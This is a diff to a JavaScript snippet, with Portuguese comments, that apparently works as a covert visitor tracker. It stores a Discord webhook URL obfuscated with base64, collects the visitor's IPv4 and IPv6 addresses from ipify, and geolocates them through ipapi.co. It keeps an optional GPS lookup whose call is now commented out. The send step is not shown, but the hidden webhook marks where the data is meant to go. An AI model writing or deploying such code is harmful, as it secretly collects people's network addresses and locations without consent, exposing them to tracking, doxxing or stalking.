@@ -2,30 +2,33 @@
   // URL do seu webhook do Discord
   const WEBHOOK_URL = atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM4MjE0NDQ3ODgyMjc5MzIyOC84Nk91TGZGaDVQSWY2d1JIQU5Pamw4eVZ0aDlBZGRqX0owaERFZFV0c0NMQXVCY0FrNlZGR0o1X3hROEJYeUNreWY5cQ==');
 
-  // Função para pegar IPs (IPv4 e IPv6) via API externa (ipify e ip6ify)
+  // Função para pegar IPs (IPv4 e IPv6) via APIs externas
   async function getIPs() {
     const ips = { ipv4: null, ipv6: null };
-    try {
-      const res4 = await fetch('https://api64.ipify.org?format=json');
-      const data4 = await res4.json();
-      if (data4.ip.includes(':')) {
-        ips.ipv6 = data4.ip;
-      } else {
-        ips.ipv4 = data4.ip;
-      }
-    } catch {}
 
-    try {
-      const res6 = await fetch('https://api64.ipv6ify.com/');
-      if (res6.ok) {
-        ips.ipv6 = await res6.text();
-      }
-    } catch {}
+    const ipv4Promise = fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        if (data.ip && !data.ip.includes(':')) {
+          ips.ipv4 = data.ip;
+        }
+      })
+      .catch(() => {});
 
+    const ipv6Promise = fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        if (data.ip && data.ip.includes(':')) {
+          ips.ipv6 = data.ip;
+        }
+      })
+      .catch(() => {});
+
+    await Promise.all([ipv4Promise, ipv6Promise]);
     return ips;
   }
 
-  // Função para pegar localização por IP (fallback se GPS não autorizado)
+  // Função para pegar localização por IP
   async function getLocationByIP(ip) {
     try {
       const res = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -43,7 +46,7 @@
     }
   }
 
-  // Função para pegar localização GPS
+  // Função para pegar localização GPS (opcional)
   function getLocationByGPS() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -65,7 +68,7 @@
   }
 
   const ips = await getIPs();
-  let location = await getLocationByGPS();
+  let location = false; //await getLocationByGPS();
 
   if (!location && (ips.ipv4 || ips.ipv6)) {
     location = await getLocationByIP(ips.ipv4 || ips.ipv6);
